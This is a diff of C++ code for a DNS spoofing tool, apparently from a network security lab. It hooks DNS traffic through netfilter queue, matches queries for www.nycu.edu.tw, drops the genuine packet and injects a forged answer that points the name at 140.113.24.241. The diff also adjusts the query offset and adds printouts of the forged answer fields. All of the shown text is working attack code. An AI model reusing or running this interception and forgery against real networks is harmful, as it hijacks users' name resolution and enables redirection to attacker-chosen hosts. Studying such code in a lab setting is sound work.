@@ -404,7 +404,7 @@ void send_spoofed_dns_reply(char *packet)
         queries_len = *dns_query;
         dns_query += queries_len + 1;
     }
-    dns_query += 4;
+    dns_query += 5;
     // cout position of dns_query
     // cout << "Position of dns_query: " << dns_query - packet << endl;
     
@@ -417,9 +417,16 @@ void send_spoofed_dns_reply(char *packet)
     answer->class_ = htons(1);
     answer->ttl = htonl(5);
     answer->rdlength = htons(4);
-    // set rdata 140.113.24.241
     answer->rdata = inet_addr("140.113.24.241");
-    
+    // set rdata 140.113.24.241
+    // cout to parse answer section: name type class ttl rdlength rdata
+    cout << "Name: " << ntohs(answer->name) << endl;
+    cout << "Type: " << ntohs(answer->type) << endl;
+    cout << "Class: " << ntohs(answer->class_) << endl;
+    cout << "TTL: " << ntohl(answer->ttl) << endl;
+    cout << "RDLength: " << ntohs(answer->rdlength) << endl;
+    cout << "RData: " << inet_ntoa(*(in_addr *)&answer->rdata) << endl;
+
 
     // calculate total length  
     int total_len = (dns_query - packet) + sizeof(answer_section);
@@ -570,10 +577,9 @@ static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
                 string dns_query = ss.str();
                 if (dns_query.find("nycu") != string::npos && dns_query.find("edu") != string::npos && dns_query.find("tw") != string::npos)
                 {
-                    cout << "DNS query to www.nycu.edu.tw" << endl;
+                    // cout << "DNS query to www.nycu.edu.tw" << endl;
                     // send the spoofed DNS reply
                     // change the destination IP address to
-                    // send_spoofed_dns_reply(packet, ret);
                     send_spoofed_dns_reply(packet);
                     return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
                 }
